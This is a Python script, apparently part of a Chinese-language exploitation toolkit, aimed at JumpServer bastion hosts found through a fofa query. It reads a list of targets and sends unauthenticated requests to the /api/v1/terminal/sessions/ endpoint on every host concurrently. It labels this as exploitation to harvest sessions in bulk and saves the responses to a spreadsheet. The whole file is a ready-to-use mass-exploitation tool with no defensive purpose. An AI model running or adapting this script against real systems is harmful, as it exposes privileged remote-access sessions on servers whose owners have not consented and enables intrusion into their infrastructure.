
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork

def help():
    print('''
    fofa: product="JumpServer-堡垒机"
        1. JumpServer-堡垒机 sessions利用, 批量获取sessions
    x. 退出
    ''')

def vul_get_sessions(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
    }
    payload = ''
    method = "GET"
    path = "/api/v1/terminal/sessions/?limit=1"
    notes = ""
    return (url, method, headers, payload, path, notes)


def run():
    OUTDIR = "result/JumpServer-堡垒机"
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    file = "dat.txt"
    li = Tool.read_host_file(file)
    Tool.mkdir(OUTDIR)
    help()
    num = int(input("执行的指令: "))
    if num == 1:
        data = []
        for url in li:
            item = vul_get_sessions(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '提示', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}JumpServer-堡垒机 sessions.xlsx")

    else:
        print('bye..')

